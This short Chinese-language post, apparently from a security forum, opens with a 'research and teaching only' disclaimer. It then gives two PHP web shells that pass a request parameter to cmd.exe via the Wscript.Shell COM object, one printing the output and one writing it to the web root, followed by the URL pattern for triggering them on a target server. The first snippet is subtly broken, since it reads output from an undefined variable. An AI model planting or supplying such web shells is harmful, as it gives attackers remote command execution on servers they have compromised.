警 告
以下程序(方法)可能带有攻击性，仅供安全研究与教学之用。使用者风险自负！

/*需要Windows Script Host 5.6支持*/
<?php
$phpwsh=new COM("Wscript.Shell") or die("Create Wscript.Shell Failed!");
$phpexec=$phpwsh->exec("cmd.exe /c $cmd");
$execoutput=$wshexec->stdout();
$result=$execoutput->readall();
echo $result;
?>

/*Windows Script Host 5.6以下版本支持*/
<?php
$phpwsh=new COM("Wscript.Shell") or die("Create Wscript.Shell Failed!");
$phpwsh->run("cmd.exe /c $cmd > c://inetpub//wwwroot//result.txt");
?>

将以上代码保存成*.php文件之后可以在浏览器中执行
http://www.target.com/simple.php?cmd=[Command]